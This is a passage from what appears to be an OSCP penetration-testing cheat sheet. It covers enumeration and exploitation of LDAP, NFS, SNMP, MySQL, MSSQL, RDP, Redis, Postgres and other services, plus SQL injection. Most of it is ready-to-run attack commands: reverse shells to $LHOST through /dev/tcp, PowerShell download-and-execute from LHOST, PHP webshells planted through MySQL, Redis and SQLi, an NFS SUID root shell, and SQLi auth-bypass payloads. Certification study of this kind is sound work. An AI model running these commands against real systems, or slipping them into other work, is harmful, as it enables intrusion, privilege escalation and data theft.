<summary>📒 4.7 LDAP --- Ports 389, 636, 3268, 3269</summary>






``` bash
# ── ANONYMOUS BIND ────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -b "" -s base
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=*)" > scans/ldap/anon_dump.txt

# ── AUTHENTICATED ─────────────────────────────────────────────
ldapsearch -x -H ldap://$IP -D "cn=user,dc=domain,dc=com" -w pass -b "dc=domain,dc=com"
ldapsearch -x -H ldap://$IP -D "domain\\user" -w pass -b "dc=domain,dc=com" "(objectClass=user)"

# ── USEFUL LDAP QUERIES ───────────────────────────────────────
# All users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
# All computers:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=computer)" name
# All groups:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=group)" name cn
# Admin users:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(adminCount=1)" sAMAccountName
# Password policy:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=domain)" pwdProperties
# Users with SPN (Kerberoastable):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
# AS-REP Roastable (no preauth):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
# Descriptions (often contain passwords!):
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" description sAMAccountName | grep -A1 "description:"

# ── LDAPDOMAINDUMP ────────────────────────────────────────────
ldapdomaindump -u 'domain\user' -p 'pass' $IP -o loot/ldap/
# Creates HTML/JSON/grep-able files of all objects

# ── TIPS ──────────────────────────────────────────────────────
# Port 3268 = Global Catalog (LDAP) — often more data
# Port 3269 = Global Catalog over SSL
# Always check description field — admins leave passwords here
# Check for "password" in any attribute:
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=com" "(objectClass=user)" | grep -i pass
```


</details>


<details>


<summary>📂 4.8 NFS --- Port 2049</summary>






``` bash
# ── ENUMERATION ───────────────────────────────────────────────
showmount -e $IP
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p2049 $IP
rpcinfo -p $IP | grep nfs

# ── MOUNT ─────────────────────────────────────────────────────
mkdir /mnt/nfs
mount -t nfs $IP:/share /mnt/nfs -o nolock
mount -t nfs4 $IP:/share /mnt/nfs   # NFSv4
ls -la /mnt/nfs                     # Check permissions

# ── NO_ROOT_SQUASH EXPLOIT ────────────────────────────────────
# Check /etc/exports on target (if readable):
cat /etc/exports     # Look for no_root_squash
# If present:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash   # Set SUID
# On target:
/mnt/nfs/bash -p         # Gives root

# Alternative — create SUID shell:
# On attacker:
cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
EOF
gcc /tmp/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid
# On target: /tmp/suid

# ── UID IMPERSONATION ─────────────────────────────────────────
# If files owned by UID 1001 and you can't read them:
# Create user with same UID on your Kali:
useradd -u 1001 tempuser
su tempuser
cat /mnt/nfs/sensitive_file
```


</details>


<details>


<summary>🔌 4.9 RPC --- Ports 111, 135</summary>






``` bash
# ── RPCBIND (111) ─────────────────────────────────────────────
rpcinfo -p $IP
nmap --script rpcinfo -p111 $IP

# ── RPCCLIENT (135) ───────────────────────────────────────────
rpcclient -U "" -N $IP         # Null session
rpcclient -U "user%pass" $IP

# Useful rpcclient commands:
rpcclient> srvinfo               # Server info
rpcclient> enumdomains           # List domains
rpcclient> querydominfo          # Domain info
rpcclient> enumdomusers          # List users
rpcclient> enumdomgroups         # List groups
rpcclient> queryuser 0x1f4       # User details (RID in hex)
rpcclient> getdompwinfo          # Password policy
rpcclient> enumalsgroups domain  # Alias groups
rpcclient> lookupnames user      # Get SID for user
rpcclient> lookupsids S-1-5-21-xxx-xxx-xxx-1000   # Get username for SID

# ── RID CYCLING (enumerate users) ─────────────────────────────
for i in $(seq 500 1200); do
  rpcclient -U "" -N $IP -c "queryuser $(printf '0x%x' $i)" 2>/dev/null | grep -i "user name"
done
# Or with nxc:
nxc smb $IP -u '' -p '' --rid-brute


# ── MSRPC SPECIFIC ATTACKS ────────────────────────────────────
# PrintNightmare check:
nmap --script msrpc-enum $IP
impacket-rpcdump $IP | grep -i print
```


</details>


<details>


<summary>📡 4.10 SNMP --- Port 161 UDP</summary>






``` bash
# ── COMMUNITY STRING BRUTEFORCE ───────────────────────────────
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
onesixtyone -c /usr/share/wordlists/metasploit/snmp_default_pass.txt $IP
# Or with nmap:
nmap -sU -p161 --script snmp-brute $IP

# ── SNMPWALK (dump everything) ────────────────────────────────
snmpwalk -c public -v1 $IP > scans/snmp/full.txt 2>/dev/null
snmpwalk -c public -v2c $IP > scans/snmp/full_v2.txt 2>/dev/null

# ── TARGETED OID QUERIES ──────────────────────────────────────
# Running processes (GOLD MINE — reveals service names/paths/args):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2
# Process command lines (even better — may show passwords in args!):
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.5
# Installed software:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2
# Network interfaces:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.2.2.1
# Open TCP ports:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3
# User accounts:
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25
# System info:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.1

# ── SNMP-CHECK ────────────────────────────────────────────────
snmp-check $IP -c public -v 1
snmp-check $IP -c public -v 2c

# ── SNMPSET (write, if writable community) ────────────────────
snmpset -c private -v1 $IP 1.3.6.1.2.1.1.6.0 s "pwned"

# ── SNMP TO SHELL (if Net-SNMP with extend) ───────────────────
# If extend functionality enabled:
snmpwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# ── TIPS ──────────────────────────────────────────────────────
# Process args often leak: passwords, connection strings, API keys
# Windows SNMP leaks usernames, shares, services, software list
# SNMPv3 auth: snmpwalk -v3 -l authPriv -u user -a SHA -A authpass -x AES -X privpass $IP
```


</details>


<details>


<summary>🗄️ 4.11 MySQL --- Port 3306</summary>






``` bash
# ── CONNECT ───────────────────────────────────────────────────
mysql -h $IP -u root -p
mysql -h $IP -u root --password=''
mysql -h $IP -u root --password=root
mysql -h $IP -u '' --password=''     # Anonymous

# ── ENUMERATION ───────────────────────────────────────────────
SHOW databases;
USE mysql;
SHOW tables;
SELECT * FROM user;                  # Username + password hashes
SELECT user, host, authentication_string FROM mysql.user;
SELECT @@hostname, @@datadir, @@version, @@global.secure_file_priv;
SHOW variables LIKE 'secure_file_priv';  # Empty = can read/write anywhere!

# ── FILE READ ─────────────────────────────────────────────────
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/var/www/html/config.php');

# ── FILE WRITE → WEBSHELL ─────────────────────────────────────
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
-- Need: FILE privilege + secure_file_priv = '' + write access to path

# ── UDF PRIVILEGE ESCALATION ──────────────────────────────────
# If running as root + plugin_dir writable:
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('id > /tmp/out; chown user /tmp/out');

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP mysql -t 2

# ── NMAP SCRIPTS ──────────────────────────────────────────────
nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password -p3306 $IP
```


</details>


<details>


<summary>🗄️ 4.12 MSSQL --- Port 1433</summary>






``` bash
# ── CONNECT ───────────────────────────────────────────────────
impacket-mssqlclient domain/user:pass@$IP
impacket-mssqlclient user:pass@$IP -windows-auth     # Windows auth
impacket-mssqlclient user:pass@$IP -port 1433

# ── ENUMERATION ───────────────────────────────────────────────
SELECT @@version;
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT name FROM master.dbo.sysdatabases;
SELECT srvname, isremote FROM sysservers;     # Linked servers!
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
EXEC xp_msver;                                # Server info

# ── XP_CMDSHELL → RCE ─────────────────────────────────────────
-- Enable (need sysadmin):
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://LHOST/shell.ps1'')"';

-- If can't enable directly:
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\output.txt', 0, TRUE;

# ── LINKED SERVER ATTACK ──────────────────────────────────────
EXEC ('SELECT @@version') AT [linkedserver];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [linkedserver];

# ── FILE READ ─────────────────────────────────────────────────
CREATE TABLE t (content NVARCHAR(4000));
BULK INSERT t FROM 'c:\windows\win.ini' WITH (ROWTERMINATOR = '\n');
SELECT * FROM t;

# Forced-authentication / poisoning workflow intentionally omitted.

# ── NMAP + CME ────────────────────────────────────────────────
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p1433 $IP
nxc mssql $IP -u user -p pass -q "SELECT @@version"
nxc mssql $IP -u user -p pass --local-auth -q "EXEC xp_cmdshell 'whoami'"
```


</details>


<details>


<summary>🖥️ 4.13 RDP --- Port 3389</summary>






``` bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 $IP -p3389
nmap --script rdp-enum-encryption -p3389 $IP

# ── CONNECT ───────────────────────────────────────────────────
xfreerdp /u:user /p:pass /v:$IP
xfreerdp /u:user /p:pass /v:$IP +clipboard              # Enable clipboard
xfreerdp /u:user /p:pass /v:$IP /drive:kali,/tmp        # Mount /tmp as share
xfreerdp /u:user /p:pass /v:$IP /dynamic-resolution /cert-ignore
xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP          # Pass-the-hash!
rdesktop -u user -p pass $IP -g 1280x720
rdesktop -u user -p pass $IP -r disk:share=/tmp         # Mount share

# ── PASS-THE-HASH RDP ─────────────────────────────────────────
# Requires: Restricted Admin Mode enabled on target
# STATE CHANGE: first record the current value and write the rollback command.
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
# Enable only if the proven path requires it and you have local admin:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
xfreerdp /u:Administrator /pth:NTLMHASH /v:$IP

# ── CVEs ──────────────────────────────────────────────────────
# BlueKeep (CVE-2019-0708) - Pre-auth RCE - Windows 7/2008R2/2003/XP
nmap --script rdp-vuln-ms12-020 $IP
# MSF ONE-TARGET LOCK — only after choosing this target: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# DejaBlue (CVE-2019-1181/1182) - Windows 8+/2012+

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -l administrator -P "$SHORTLIST" rdp://$IP -t 1 -f
test -s "$SHORTLIST" && crowbar -b rdp -s $IP/32 -u user -C "$SHORTLIST" -n 1

# ── SCREENSHOTTING (if RDP session alive but locked) ──────────
# If you have code exec but no interactive:
tscon 1 /dest:console   # Hijack another user's session!
# List sessions: query user OR qwinsta
```


</details>


<details>


<summary>🔧 4.14 WinRM --- Ports 5985, 5986</summary>






``` bash
# ── CHECK IF ACCESSIBLE ───────────────────────────────────────
nmap -p5985,5986 $IP
nxc winrm $IP -u user -p pass

# ── EVIL-WINRM (best tool) ────────────────────────────────────
evil-winrm -i $IP -u user -p pass
evil-winrm -i $IP -u user -H NTLMHASH          # PtH
evil-winrm -i $IP -u user -p pass -S            # SSL (port 5986)
evil-winrm -i $IP -u user -p pass \
  -e /path/to/executables \     # Upload and exec
  -s /path/to/ps1-scripts       # Load PS1 scripts in session

# Inside evil-winrm:
# upload /local/file C:\remote\file
# download C:\remote\file /local/file
# Invoke-Binary /path/to/binary   (bypass AV)
# menu    → shows available commands

# ── SSL WINRM (5986) ──────────────────────────────────────────
evil-winrm -i $IP -u user -p pass -S -P 5986
# Or with cert:
evil-winrm -i $IP -c cert.pem -k key.pem -S
```


</details>


<details>


<summary>🔴 4.15 Redis --- Port 6379</summary>






``` bash
# ── UNAUTHENTICATED ACCESS ────────────────────────────────────
redis-cli RCE : https://github.com/Ridter/redis-rce/pull/5/changes/be45d113ebcfef407bb1fba8b574c36daa4a2bb9#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5
redis-cli -h $IP ping          # PONG = accessible
redis-cli -h $IP
> info server                   # Version + OS
> config get *                  # All config settings
> keys *                        # List all keys
> get key_name                  # Get key value
> dbsize                        # Count of keys

# ── WITH AUTH ─────────────────────────────────────────────────
redis-cli -h $IP -a password
redis-cli -h $IP
> AUTH password

# ── WEBSHELL VIA REDIS ────────────────────────────────────────
redis-cli -h $IP
> config set dir /var/www/html
> config set dbfilename shell.php
> set pwn "<?php system($_GET['cmd']); ?>"
> save
# → Access: http://$IP/shell.php?cmd=id

# ── SSH KEY VIA REDIS ─────────────────────────────────────────
ssh-keygen -t rsa -f /tmp/redis_key -N ""
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/spaced.txt
# MUTATION GATE: record CONFIG GET dir/dbfilename and preserve the destination first.
redis-cli -h $IP config get dir
redis-cli -h $IP config get dbfilename
redis-cli -h $IP -x set pwn < /tmp/spaced.txt
redis-cli -h $IP config set dir /root/.ssh/
redis-cli -h $IP config set dbfilename authorized_keys
redis-cli -h $IP save
ssh -i /tmp/redis_key root@$IP

# ── REDIS CRON JOB RCE — DESTRUCTIVE LAST RESORT ─────────────
# This can overwrite a privileged crontab. Back it up and write rollback first.
redis-cli -h $IP config set dir /var/spool/cron/
redis-cli -h $IP config set dbfilename root
redis-cli -h $IP set pwn "\n\n* * * * * bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\n\n"
redis-cli -h $IP save

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -P "$SHORTLIST" redis://$IP -t 1 -f
```


</details>


<details>


<summary>🔶 4.16 Oracle TNS --- Port 1521</summary>






``` bash
# ── ENUMERATION ───────────────────────────────────────────────
nmap --script oracle-tns-version,oracle-sid-brute -p1521 $IP
tnscmd10g version -h $IP
tnscmd10g status -h $IP

# ── SID BRUTE FORCE ───────────────────────────────────────────
odat sidguesser -s $IP
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 $IP oracle-sid
# MSF ONE-TARGET LOCK — only after choosing this target: use auxiliary/scanner/oracle/sid_brute

# ── ODAT — ORACLE DATABASE ATTACK TOOL ───────────────────────
odat all -s $IP -p 1521         # All checks
odat passwordguesser -s $IP -d SID
odat utlfile -s $IP -d SID -U user -P pass --sysdba --putFile /tmp shell.php "<?php system($_GET['cmd']); ?>"

# ── CONNECT ───────────────────────────────────────────────────
sqlplus user/pass@$IP/SID
sqlplus user/pass@$IP/SID as sysdba    # Priv connection
# Common default creds:
# sys:change_on_install | system:manager | scott:tiger | DBSNMP:DBSNMP
```


</details>


<details>


<summary>🍃 4.17 MongoDB --- Port 27017</summary>






``` bash
# ── CONNECT ───────────────────────────────────────────────────
mongo $IP
mongo $IP:27017
mongo $IP/admin -u user -p pass

# ── ENUMERATION ───────────────────────────────────────────────
> show dbs
> use admin
> db.getUsers()
> db.runCommand({connectionStatus:1})
> db.adminCommand({listDatabases:1})
> show collections
> db.collection.find()
> db.collection.find().pretty()

# ── NOSQL INJECTION ───────────────────────────────────────────
# In web forms that use MongoDB backend:
username[$ne]=invalid&password[$ne]=invalid   # Not-equal bypass
username=admin&password[$regex]=.*            # Regex bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# Mongo Injection payloads:
username=admin'%20||%20'1'=='1'&password=x
```


</details>


<details>


<summary>🖥️ 4.18 VNC --- Ports 5900-5909</summary>






``` bash
# ── FINGERPRINT ───────────────────────────────────────────────
nmap -sV -p5900 $IP
nmap -Pn -n --script vnc-info -p5900 $IP

# ── CONNECT ───────────────────────────────────────────────────
vncviewer $IP
vncviewer $IP:1           # Display 1
vncviewer $IP::5901       # Explicit port

# ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
# Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
SHORTLIST=notes/password-shortlist.txt
test -s "$SHORTLIST" && hydra -P "$SHORTLIST" $IP vnc -t 1
test -s "$SHORTLIST" && medusa -h $IP -P "$SHORTLIST" -M vnc -t 1

# ── DECRYPT SAVED VNC PASSWORD ────────────────────────────────
# Found .vnc config or registry entry
# Decrypt (uses fixed 3DES key):
python3 -c "
import base64; from Crypto.Cipher import DES3
enc = bytes.fromhex('HEXPASSWORD')
key = b'\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0'
print(DES3.new(key, DES3.MODE_ECB).decrypt(enc).rstrip(b'\x00'))"
# Or use: vncpwd / vncpasswd tool
```


</details>


<details>


<summary>📞 4.19 Other Notable Services</summary>






``` bash
# ── TELNET (23) ───────────────────────────────────────────────
telnet $IP 23
# Test only a justified default/known credential manually; do not spray by default.
nmap -Pn -n -sV --script telnet-encryption -p23 $IP

# ── POP3 (110) ───────────────────────────────────────────────
nc -nv $IP 110
USER admin
PASS password
LIST           # List emails
RETR 1         # Read email 1

# ── IMAP (143) ────────────────────────────────────────────────
nc -nv $IP 143
a LOGIN user password
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[]

# ── IRC (6667) ────────────────────────────────────────────────
nmap --script irc-botnet-channels,irc-info -p6667 $IP
# UnrealIRCd backdoor (CVE-2010-2075)
nc -nv $IP 6667
AB; bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# ── RSYNC (873) ───────────────────────────────────────────────
rsync rsync://$IP/                    # List shares
rsync rsync://$IP/share               # List share contents
rsync rsync://$IP/share /tmp/rsync/   # Download all
rsync /tmp/shell "rsync://$IP/share/"  # Upload only after proving the module is writable

# ── CUPS (631) ────────────────────────────────────────────────
# Printing service — often on Linux
curl http://$IP:631/
nmap --script cups-info -p631 $IP

# ── DOCKER API (2375, 2376) ───────────────────────────────────
curl http://$IP:2375/version
curl http://$IP:2375/containers/json
docker -H tcp://$IP:2375 ps
docker -H tcp://$IP:2375 run -v /:/mnt -it alpine chroot /mnt sh

# ── KUBERNETES API (6443, 8443, 8080) ─────────────────────────
curl https://$IP:6443/api/v1 -k
kubectl --server=https://$IP:6443 get pods --all-namespaces

# ── ELASTICSEARCH (9200) ──────────────────────────────────────
curl http://$IP:9200/
curl http://$IP:9200/_cat/indices
curl http://$IP:9200/index/_search?pretty

# ── CASSANDRA (9042) ──────────────────────────────────────────
nmap --script cassandra-info -p9042 $IP

# ── POSTGRES (5432) ───────────────────────────────────────────
psql -h $IP -U postgres
psql -h $IP -U postgres -c "\l"      # List databases
psql -h $IP -U postgres -c "SELECT pg_read_file('/etc/passwd')"
psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'id'"
# RCE via COPY TO PROGRAM:
psql -h $IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c ''bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'''"

# ── KERBEROS (88) ─────────────────────────────────────────────
# See Active Directory section for full Kerb attacks
nmap --script krb5-enum-users --script-args krb5-enum-users.realm=domain.com -p88 $IP
kerbrute userenum -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc $IP
```


</details>


------------------------------------------------------------------------

## 5. VULNERABILITY IDENTIFICATION


<details>


<summary>🔎 5.1 Searchsploit --- Master Workflow</summary>






``` bash
# ── BASIC SEARCH ──────────────────────────────────────────────
searchsploit apache 2.4.49
searchsploit openssh 7.2
searchsploit "windows 7" "privilege escalation"
searchsploit -t "Remote" "Buffer Overflow"    # Title search

# ── FLAGS ─────────────────────────────────────────────────────
searchsploit -x 12345          # Examine (read without copying)
searchsploit -m 12345          # Mirror (copy to current dir)
searchsploit -w 12345          # Show web URL
searchsploit --update          # Update database
searchsploit -p 12345          # Full path

# ── SEARCH FROM NMAP OUTPUT ───────────────────────────────────
searchsploit --nmap scans/nmap/targeted.xml

# ── FIX EXPLOITS (common issues) ──────────────────────────────
# Change LHOST/LPORT/RHOST in exploit:
sed -i 's/LHOST/$LHOST/g' exploit.py
# Python2 → Python3:
2to3 exploit.py -w
# Check imports, fix urllib issues:
# urllib.request, urllib.parse instead of urllib in Py3

# ── COMPILE C EXPLOITS ────────────────────────────────────────
gcc exploit.c -o exploit
gcc exploit.c -o exploit -m32                          # 32-bit
gcc exploit.c -o exploit -pthread -lcrypt              # With libs
gcc exploit.c -o exploit -lpthread                     # Pthread
# Cross-compile for Windows:
i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit Windows
x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe      # 64-bit Windows
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # With winsock

# ── EXPLOIT MODIFICATION CHECKLIST ───────────────────────────
# Before running ANY exploit:
# 1. Read the code — understand what it does
# 2. Check: does it need a listener? what port?
# 3. Update IP, port, path variables
# 4. Check Python version requirements
# 5. Check library dependencies (pip install X)
# 6. Test on local machine if possible
# 7. Note any destructive operations (rm, format, crash)
```


</details>


<details>


<summary>🎯 5.2 Metasploit --- Smart Usage for OSCP</summary>

> ⚠️ **EXAM-RESTRICTED:** choose and record one target before using any Auxiliary, Exploit or Post module, Meterpreter payload, or module `check`. A failed attempt still locks usage to that target. Never pivot with Metasploit. `msfvenom` and `exploit/multi/handler` are the published exceptions, but Meterpreter remains one-target-only.






``` bash
# ── SETUP ─────────────────────────────────────────────────────
msfconsole -q                          # Quiet start
msf> workspace -a $IP
msf> db_import scans/nmap/targeted.xml  # Import saved Nmap XML after choosing the MSF target

# ── SEARCH ────────────────────────────────────────────────────
msf> search type:exploit platform:windows ms17-010
msf> search cve:2021-41773
msf> search name:eternalblue

# ── USE WITHOUT METERPRETER (for OSCP — use shell payloads!) ──
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set PAYLOAD windows/x64/shell_reverse_tcp   # NOT meterpreter
msf> set RHOSTS $IP
msf> set LHOST $LHOST
msf> set LPORT $LPORT
msf> run

# ── AUXILIARY MODULES — THESE *DO* COUNT TOWARD THE ONE-TARGET LIMIT ──
msf> use auxiliary/scanner/smb/smb_ms17_010   # Just scanning
msf> use auxiliary/scanner/ssh/ssh_enumusers
msf> use auxiliary/scanner/mssql/mssql_login

# troubleshooting
# if you are not able to use exploit and error is saying ambiguos; try _reload_all_ command in msf shell.
# if after executing _run_ command you are getting unable to load package, then try _msfdb reinit_ in root shell

# ── TIPS ──────────────────────────────────────────────────────
# OSCP RULE: Auxiliary/Exploit/Post modules and Meterpreter are limited to ONE target.
# Even using a module's `check` on a target locks Metasploit usage to that target.
# Metasploit cannot be used for pivoting.
# msfvenom and exploit/multi/handler may be used against all targets;
# Meterpreter payload use is still restricted to the one selected target.
# Use Nmap/manual tools for scanning other targets and record which target is MSF-locked.
```


</details>


------------------------------------------------------------------------


<details>


<summary>🧭 5.x 2026 CVE Triage Methodology --- Do Not Exploit by Version Alone</summary>






``` text
EXACT PRODUCT
      ↓
EXACT VERSION / BUILD / PACKAGE REVISION
      ↓
VENDOR ADVISORY
      ↓
NVD / SECURITY TRACKER
      ↓
LOCAL OR REMOTE?
      ↓
AUTHENTICATION / PRIVILEGE REQUIRED?
      ↓
CONFIGURATION / MODULE / DRIVER PREREQUISITES
      ↓
MITIGATIONS / PATCH BACKPORTS
      ↓
PUBLIC PoC / REPRODUCER
      ↓
SOURCE + PREREQUISITE REVIEW
      ↓
TARGET
```

For every candidate CVE record:

-   [ ] CVE ID
-   [ ] Product/component
-   [ ] Affected versions/builds
-   [ ] Local/remote/authenticated
-   [ ] Required privileges
-   [ ] Required configuration/module/service
-   [ ] Architecture
-   [ ] Mitigations
-   [ ] Public PoC/reproducer
-   [ ] Reliability
-   [ ] Detection/validation command
-   [ ] Primary reference

**Important:** distro vendors frequently backport security fixes without
changing the upstream-looking version string. Always check the distro
package revision/security tracker before declaring a target vulnerable.

Primary references:

-   NVD: https://nvd.nist.gov/
-   Microsoft MSRC: https://msrc.microsoft.com/
-   Ubuntu Security: https://ubuntu.com/security/notices
-   Debian Security Tracker: https://security-tracker.debian.org/
-   Exploit-DB: https://www.exploit-db.com/


</details>


------------------------------------------------------------------------

## 6. WEB APPLICATION ATTACKS


<details>


<summary>📋 6.1 Web Pentest Methodology (Full Checklist)</summary>






    BEFORE TOUCHING A SINGLE INPUT:
    [ ] Page source (Ctrl+U) — comments, hidden fields, version info
    [ ] robots.txt, sitemap.xml
    [ ] Response headers (Server, X-Powered-By, Set-Cookie)
    [ ] SSL cert (hostnames, org name, email)
    [ ] Error pages (trigger 404/500 — reveals tech stack)
    [ ] Cookies — decode base64, JWT, check HttpOnly/Secure flags
    [ ] JavaScript files — may contain API keys, endpoints, logic
    [ ] Browser console errors
    [ ] Network tab — background API calls, hidden parameters

    DIRECTORY/FILE ENUM:
    [ ] gobuster/feroxbuster (medium list + extensions)
    [ ] FFUF for parameters
    [ ] Check ALL discovered pages (not just /admin)

    AUTHENTICATION:
    [ ] Try default creds
    [ ] Register new account (see what you can access)
    [ ] Check "forgot password" flow
    [ ] Check user enumeration on login (different error for valid user)

    INPUT TESTING:
    [ ] Every text input → SQLi, XSS, SSTI, LDAP injection
    [ ] File upload → bypass, webshell
    [ ] URL parameters → LFI, RFI, path traversal, SSRF
    [ ] Hidden form fields → IDOR, privilege escalation
    [ ] API endpoints → auth bypass, information disclosure


</details>


<details>


<summary>💉 6.2 SQL Injection --- Complete Arsenal</summary>






``` bash
# ── DETECTION ─────────────────────────────────────────────────
'                           # Basic error trigger
''                          # Escape the escape
`                           # MySQL backtick
')                          # Close bracket
' OR '1'='1                 # Classic auth bypass
' OR '1'='1'--              # With comment
' OR '1'='1'#               # MySQL comment
' OR '1'='1'/*              # C-style comment
admin'--                    # Comment rest of query
' OR 1=1--
" OR "1"="1
1' ORDER BY 1--             # Order by to find columns
1' ORDER BY 2--
1' ORDER BY 3--             # Error when exceeds column count

# ── AUTH BYPASS ───────────────────────────────────────────────
' OR '1'='1'--
admin'--
admin' #
' OR 1=1--
') OR ('1'='1
' OR 'x'='x
1' OR '1'='1
" OR ""="

# ── UNION BASED ───────────────────────────────────────────────
# Step 1: Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # Error = previous number was max

# Step 2: Find displayable columns
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--    # Find string columns

# Step 3: Extract data
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,user(),database()--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--

# Step 4: File read
' UNION SELECT NULL,load_file('/etc/passwd'),NULL--

# Step 5: Write webshell
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

# ── BLIND BOOLEAN ─────────────────────────────────────────────
' AND 1=1--       # True
' AND 1=2--       # False (page changes)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--

# ── BLIND TIME-BASED ──────────────────────────────────────────
# MySQL:
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a',SLEEP(5),0)--
# MSSQL:
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
# PostgreSQL:
'; SELECT pg_sleep(5)--

# ── MSSQL SPECIFIC ────────────────────────────────────────────
'; EXEC xp_cmdshell 'id'--
'; EXEC master.dbo.xp_cmdshell 'powershell -c "..."'--
# Stacked queries:
'; SELECT 1; SELECT 2--

# ── POSTGRESQL SPECIFIC ───────────────────────────────────────
'; COPY (SELECT '') TO PROGRAM 'id'--
'; CREATE TABLE t(c text); COPY t FROM PROGRAM 'id'--
'; DROP TABLE IF EXISTS t; CREATE TABLE t(c text); COPY t FROM PROGRAM 'curl http://LHOST/shell.sh | bash'--

# SQLmap is intentionally omitted: automatic exploitation is prohibited.
